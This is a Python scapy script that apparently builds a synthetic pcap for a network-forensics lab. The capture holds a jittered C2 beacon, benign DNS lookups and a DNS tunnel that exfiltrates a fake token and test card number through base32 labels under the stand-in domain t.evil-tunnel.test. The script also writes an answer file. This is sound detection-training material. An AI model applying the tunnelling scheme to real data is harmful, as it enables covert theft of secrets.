#!/usr/bin/env python3
# Lab 7.3 - tao pcap THAT chua: (1) beacon C2 nhip deu + jitter, (2) DNS tunnel exfil
# bang nhan base32 dai tren mot domain cha, (3) DNS lanh de doi chieu entropy.
# Chay: python3 -I make.py
import os, random, base64
from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap

HERE = os.path.dirname(os.path.abspath(__file__))
random.seed(1337)  # co dinh de pcap va transcript tai lap duoc

pkts = []
CMAC, GWMAC = "02:00:00:00:00:01", "02:00:00:00:00:fe"
cli, c2, resolver = "10.0.0.50", "10.0.0.200", "10.0.0.53"
base = 1768200000.0

# ---- 1) BEACON: ket noi TLS-ish ngan toi C2:443 moi ~60s, jitter +/-5s ----
t = base
beacon_times = []
def mk(src, dst, sport, dport, f, seq, ack, tm, pl=b""):
    p = Ether(src=CMAC, dst=GWMAC)/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags=f, seq=seq, ack=ack)
    if pl: p = p/Raw(pl)
    p.time = tm
    return p
for i in range(12):
    beacon_times.append(t)
    cs, ss, cp = 1000+i*10, 9000+i*10, 40000+i
    pkts.append(mk(cli, c2, cp, 443, "S",  cs,        0,          t))
    pkts.append(mk(c2, cli, 443, cp, "SA", ss,        cs+1,       t+0.02))
    pkts.append(mk(cli, c2, cp, 443, "A",  cs+1,      ss+1,       t+0.03))
    pkts.append(mk(cli, c2, cp, 443, "PA", cs+1,      ss+1,       t+0.04, b"\x17\x03\x03\x00\x20"+bytes(random.getrandbits(8) for _ in range(32))))
    pkts.append(mk(c2, cli, 443, cp, "PA", ss+1,      cs+1+37,    t+0.08, b"\x17\x03\x03\x00\x10"+bytes(random.getrandbits(8) for _ in range(16))))
    pkts.append(mk(cli, c2, cp, 443, "FA", cs+1+37,   ss+1+21,    t+0.10))
    pkts.append(mk(c2, cli, 443, cp, "FA", ss+1+21,   cs+1+37+1,  t+0.12))
    t += 60 + random.uniform(-5, 5)

# ---- 2) DNS lanh de doi chieu entropy ----
benign = ["www.google.com", "api.github.com", "update.microsoft.com", "cdn.jsdelivr.net"]
qid, tb = 1, base+5
for name in benign:
    q = (Ether(src=CMAC, dst=GWMAC)/IP(src=cli, dst=resolver)/UDP(sport=50000+qid, dport=53)/
         DNS(id=qid, rd=1, qd=DNSQR(qname=name)))
    q.time = tb; tb += 0.03
    a = (Ether(src=GWMAC, dst=CMAC)/IP(src=resolver, dst=cli)/UDP(sport=53, dport=50000+qid)/
         DNS(id=qid, qr=1, rd=1, ra=1, qd=DNSQR(qname=name),
             an=DNSRR(rrname=name, ttl=300, rdata="93.184.216.34")))
    a.time = tb; tb += 20.0
    pkts.extend([q, a]); qid += 1

# ---- 3) DNS tunnel: exfil mot bi mat qua nhan base32 tren domain cha ----
parent = "t.evil-tunnel.test"
secret = b"SESSION_TOKEN=4f9c2a1b7e;card=4111111111111111;exfil-via-dns-labels"
b32 = base64.b32encode(secret).decode().rstrip("=").lower()
labels = [b32[i:i+32] for i in range(0, len(b32), 32)]  # <=32 ky tu moi nhan
tt = base+30
for idx, lab in enumerate(labels):
    qname = f"{idx:02d}{lab}.{parent}"
    q = (Ether(src=CMAC, dst=GWMAC)/IP(src=cli, dst=resolver)/UDP(sport=51000+idx, dport=53)/
         DNS(id=4000+idx, rd=1, qd=DNSQR(qname=qname, qtype="TXT")))
    q.time = tt; tt += 0.05
    a = (Ether(src=GWMAC, dst=CMAC)/IP(src=resolver, dst=cli)/UDP(sport=53, dport=51000+idx)/
         DNS(id=4000+idx, qr=1, rd=1, ra=1, qd=DNSQR(qname=qname, qtype="TXT"),
             an=DNSRR(rrname=qname, type="TXT", ttl=1, rdata="ok")))
    a.time = tt; tt += 1.5
    pkts.extend([q, a])

pkts.sort(key=lambda p: p.time)
wrpcap(os.path.join(HERE, "lab73.pcap"), pkts)
with open(os.path.join(HERE, "expected_secret.txt"), "wb") as f:
    f.write(secret)
print("Da tao lab73.pcap:", len(pkts), "goi;", len(beacon_times), "beacon;",
      len(labels), "nhan tunnel; secret", len(secret), "bytes")
